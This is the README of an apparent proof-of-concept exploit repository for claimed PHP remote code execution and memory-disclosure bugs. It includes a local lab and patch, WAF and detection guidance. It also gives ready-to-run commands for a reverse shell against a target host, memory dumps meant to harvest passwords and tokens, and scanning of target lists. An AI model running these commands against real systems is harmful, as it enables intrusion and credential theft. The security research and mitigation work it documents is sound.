<div align="center">

# PHP2Shell

```
 ██████╗ ██╗  ██╗██████╗ ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
 ██╔══██╗██║  ██║██╔══██╗╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
 ██████╔╝███████║██████╔╝ █████╔╝███████╗███████║█████╗  ██║     ██║     
 ██╔═══╝ ██╔══██║██╔═══╝ ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║     
 ██║     ██║  ██║██║     ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

### 🎯 Critical PHP Remote Code Execution & Memory Disclosure

**4 Bugs · 6 Exploit Paths · 3 CMS Demos · Works on Linux & Windows**

<br>

[![CVE-2026-109618](https://img.shields.io/badge/CVE--2026--109618-Memory%20Disclosure-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2026-109618)
[![CVE-2026-109619](https://img.shields.io/badge/CVE--2026--109619-Remote%20Code%20Execution-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2026-109619)
[![CVSS](https://img.shields.io/badge/CVSS-9.2%20CRITICAL-darkred?style=for-the-badge)](https://www.first.org/cvss/)
[![PHP](https://img.shields.io/badge/PHP-8.2%20→%208.5-blue?style=for-the-badge&logo=php&logoColor=white)](https://www.php.net/)

<br>

[![CI](https://github.com/memuratozturk/php2shell-poc/actions/workflows/ci.yml/badge.svg)](https://github.com/memuratozturk/php2shell-poc/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-3776AB.svg?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Docker](https://img.shields.io/badge/Docker-Lab%20Ready-2496ED.svg?style=flat-square&logo=docker&logoColor=white)](lab/docker-compose.yml)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)]()

<br>

[**Quick Start**](#-quick-start) · [**How It Works**](#-how-it-works) · [**Screenshots**](#-screenshots) · [**Documentation**](#-documentation)

</div>

---

## 📖 What is PHP2Shell?

PHP2Shell is a **security research toolkit** for critical PHP vulnerabilities. These bugs allow attackers to:

- ✅ **Run commands** on any PHP server (Remote Code Execution)
- ✅ **Read server memory** like passwords and tokens (Memory Disclosure)
- ✅ **No login needed** — works without any authentication
- ✅ **No file upload needed** — just send a simple HTTP request

> ⚠️ **Impact:** About 30% of all PHP websites use `mod_php` and are vulnerable. This includes WordPress, Drupal, and Joomla.

### Who Found This?

[Wiz Research](https://www.wiz.io/blog/php2shell-php-rce) discovered these bugs in October 2026. This repository has **independently verified** proof-of-concept exploits.

---

## 🎯 Vulnerability Summary

| Bug | What It Does | Severity |
|-----|-------------|----------|
| **Bug 1** | Run any command on the server | 🔴 Critical |
| **Bug 2** | Read passwords from server memory | 🔴 Critical |
| **Bug 3** | Use-After-Free memory bug | 🟠 High |
| **Bug 4** | OPcache memory corruption | 🔴 Critical |

### Which PHP Versions Are Affected?

| PHP Version | Status | Fix Available |
|-------------|--------|---------------|
| 8.4.0 – 8.4.26 | 🔴 **Vulnerable** | Update to 8.4.27 |
| 8.3.0 – 8.3.35 | 🔴 **Vulnerable** | Update to 8.3.36 |
| 8.2.0 – 8.2.34 | 🔴 **Vulnerable** | Update to 8.2.35 |
| 8.5.0 – 8.5.11 | 🔴 **Vulnerable** | Update to 8.5.12 |
| 8.1.x and older | 🔴 **Vulnerable** | No fix (end of life) |
| 7.x | 🟢 **Safe** | Not affected |

---

## 🚀 Quick Start

### Step 1: Clone This Repository

```bash
git clone https://github.com/memuratozturk/php2shell-poc.git
cd php2shell-poc
```

### Step 2: Start the Test Lab

The lab runs WordPress, Drupal, and Joomla with vulnerable PHP:

```bash
cd lab
docker-compose up -d
```

Wait 30 seconds for the containers to start. Then you have:
- **WordPress** → http://127.0.0.1:9080
- **Drupal** → http://127.0.0.1:9081
- **Joomla** → http://127.0.0.1:9082

### Step 3: Run the Exploit

```bash
# Test on WordPress
python3 exploit/php2shell_exploit.py \
    -u http://127.0.0.1:9080/index.php \
    -c "id" \
    --target-os linux
```

**Expected Output:**
```
[+] Zend MM chunk base = 0x7242f2400000
[+] libphp base = 0x7242f40d1000
[+] Command executed (attempt 1)
PROOF: uid=33(www-data) gid=33(www-data)
```

🎉 **Success!** You ran a command on the server without any login.

---

## 🛠️ Available Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **php2shell_exploit.py** | Remote code execution | `python3 exploit/php2shell_exploit.py -u URL --shell` |
| **memdisclosure.py** | Read server memory | `python3 exploit/memdisclosure.py -u URL --analyze` |
| **scanner.py** | Find vulnerable servers | `python3 tools/scanner.py -u URL` |
| **shell_server.py** | Catch reverse shells | `python3 tools/shell_server.py --lhost IP` |
| **bug3_backtrace_uaf.py** | Test Bug 3 | `python3 exploit/bug3_backtrace_uaf.py --host IP` |
| **bug4_opcache_confusion.py** | Test Bug 4 | `python3 exploit/bug4_opcache_confusion.py --host IP` |

---

## 💻 Examples

### Example 1: Get a Reverse Shell

**Terminal 1** — Start the listener:
```bash
python3 tools/shell_server.py --lhost YOUR_IP --lport 4444
```

**Terminal 2** — Run the exploit:
```bash
python3 exploit/php2shell_exploit.py \
    -u http://target.com/index.php \
    --shell \
    --target-os linux
```

### Example 2: Read Server Memory

```bash
python3 exploit/memdisclosure.py \
    -u http://target.com/index.php \
    --dump leaked_memory.bin \
    --analyze
```

This can find:
- Database passwords
- API keys
- Session tokens
- Other secrets

### Example 3: Scan Multiple Targets

```bash
# Single target
python3 tools/scanner.py -u http://target.com

# Multiple targets from file
python3 tools/scanner.py -t targets.txt -o results.csv
```

---

## 📸 Screenshots

### WordPress RCE — Running `id` Command

![WordPress RCE](docs/images/evidence-wordpress_rce.png)

### Memory Disclosure — 4096 Bytes Leaked

![Memory Leak](docs/images/evidence-memdisclosure.png)

### Drupal & Joomla — Same Attack Works

<img src="docs/images/evidence-drupal_rce.png" width="49%"> <img src="docs/images/evidence-joomla_rce.png" width="49%">

### Patched vs Unpatched Comparison

<img src="docs/images/evidence-patched_vs_unpatched.png" width="49%"> <img src="docs/images/evidence-fpm_vs_modphp.png" width="49%">

---

## 🔬 How It Works

### The Attack Chain (Simple Explanation)

```
1. Attacker sends a special HTTP POST request
         ↓
2. PHP starts processing but runs out of memory (OOM)
         ↓
3. PHP crashes but leaves memory pointers behind
         ↓
4. Attacker sends another request to the SAME worker
         ↓
5. The old pointers now point to attacker's data
         ↓
6. PHP follows the pointers and runs attacker's command
         ↓
7. 🎯 Remote Code Execution!
```

### Why Does This Work?

- **mod_php** keeps the same process for many requests
- When PHP crashes, it doesn't clean up properly
- The next request can use the old (bad) memory
- **PHP-FPM** is safe because each request gets a new process

### Technical Details

For the full technical explanation, see:
- [TECHNICAL.md](docs/TECHNICAL.md) — Deep dive into the bugs
- [WIZ_REPRODUCTION.md](docs/WIZ_REPRODUCTION.md) — Step-by-step reproduction guide

---

## 🛡️ How to Protect Your Server

### Option 1: Update PHP (Best Solution)

```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade php

# CentOS/RHEL
sudo dnf update php
```

### Option 2: Switch to PHP-FPM

PHP-FPM is not vulnerable to this attack:

```bash
# Disable mod_php
sudo a2dismod php8.4

# Enable PHP-FPM
sudo a2enmod proxy_fcgi
sudo systemctl restart apache2
```

### Option 3: Quick Fix (Temporary)

Add this to your `php.ini`:

```ini
session.upload_progress.enabled = 0
```

---

## 📁 Project Structure

```
php2shell-poc/
├── exploit/                    # Attack tools
│   ├── php2shell_exploit.py    # Main RCE exploit
│   ├── memdisclosure.py        # Memory leak tool
│   ├── bug3_backtrace_uaf.py   # Bug 3 tester
│   └── bug4_opcache_confusion.py # Bug 4 exploit
├── tools/                      # Helper tools
│   ├── scanner.py              # Find vulnerable servers
│   ├── shell_server.py         # Reverse shell listener
│   └── calibrate_offsets.py    # Offset calculator
├── lab/                        # Test environment
│   └── docker-compose.yml      # WordPress + Drupal + Joomla
├── docs/                       # Documentation
│   ├── TECHNICAL.md            # Technical details
│   └── WIZ_REPRODUCTION.md     # Reproduction guide
├── evidence/                   # Proof files
│   └── *.txt                   # Test outputs
└── tests/                      # Unit tests
    └── test_units.py           # 33 tests
```

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [TECHNICAL.md](docs/TECHNICAL.md) | Deep technical analysis of all 4 bugs |
| [WIZ_REPRODUCTION.md](docs/WIZ_REPRODUCTION.md) | How to reproduce the Wiz research |
| [PATCHED_VS_UNPATCHED.md](docs/PATCHED_VS_UNPATCHED.md) | Comparison of fixed vs vulnerable versions |
| [SECURITY.md](SECURITY.md) | Security policy |

---

## 🔗 References

| Resource | Link |
|----------|------|
| Wiz Research Blog | [PHP2Shell: Chaining 4 Bugs for PHP RCE](https://www.wiz.io/blog/php2shell-php-rce) |
| CVE-2026-109618 | [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-109618) |
| CVE-2026-109619 | [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-109619) |
| PHP Security | [PHP Security Advisory](https://www.php.net/security) |

---

## 👤 Credits

- **Wiz Research** — Original discovery and responsible disclosure
- **[@memuratozturk](https://github.com/memuratozturk)** — Independent verification, exploit development, testing
- **PHP Security Team** — Fast patching

---

## 🛡️ Mitigation Configs (WAF / Web Server)

Ready-to-use configs for blocking the exploit at the network layer:

| Platform | Config | What It Does |
|----------|--------|-------------|
| Apache ModSecurity | [`mitigation/apache/modsecurity-php2shell.conf`](mitigation/apache/modsecurity-php2shell.conf) | Blocks `PHP_SESSION_UPLOAD_PROGRESS` field |
| Apache .htaccess | [`mitigation/apache/.htaccess`](mitigation/apache/.htaccess) | Blocks multipart POST on non-upload paths |
| Cloudflare WAF | [`mitigation/cloudflare/waf-rule.txt`](mitigation/cloudflare/waf-rule.txt) | Custom WAF rule templates |
| Lighttpd | [`mitigation/lighttpd/php2shell.conf`](mitigation/lighttpd/php2shell.conf) | Block multipart on non-upload vhosts |
| FrankenPHP | [`mitigation/frankenphp/Caddyfile-snippet`](mitigation/frankenphp/Caddyfile-snippet) | Disable upload progress globally |

### Quick Fix Script (Emergency)

```bash
# Check if your PHP is vulnerable
sudo ./mitigation/quick-fix.sh --check

# Apply emergency mitigation
sudo ./mitigation/quick-fix.sh

# Revert if needed
sudo ./mitigation/quick-fix.sh --revert
```

> ⚠️ WAF rules and config changes are **temporary mitigations**. The real fix is updating PHP.

## 🔍 Threat Detection

See [docs/THREAT_DETECTION.md](docs/THREAT_DETECTION.md) for:
- Behavioral indicators (suspicious child processes)
- Network-level detection (multipart anomalies, cookie anomalies)
- YARA and Snort/Suricata rules
- Log analysis patterns
- Incident response steps

## 🧪 Nuclei Templates

Nuclei scanner templates for automated detection:

```bash
# Scan with included templates
nuclei -u http://target.com -t nuclei-templates/

# Critical RCE detection only
nuclei -u http://target.com -t nuclei-templates/CVE-2026-109619.yaml
```

See [`nuclei-templates/`](nuclei-templates/) directory.

---

## ⚠️ Legal Disclaimer

```
This tool is for AUTHORIZED SECURITY TESTING and EDUCATION only.

Using this tool against systems without permission is ILLEGAL.
You are responsible for following all local laws.
The developers are not responsible for any misuse.
```

---

## 🏷️ Topics

`php` `security` `exploit` `cve` `rce` `remote-code-execution` `memory-disclosure` `vulnerability` `penetration-testing` `security-research` `wordpress` `drupal` `joomla` `apache` `mod-php` `proof-of-concept` `ctf` `bugbounty` `infosec` `cybersecurity`

---

<div align="center">

### ⭐ Star this repo if it helped your research!

**Made by [@memuratozturk](https://github.com/memuratozturk)**

</div>
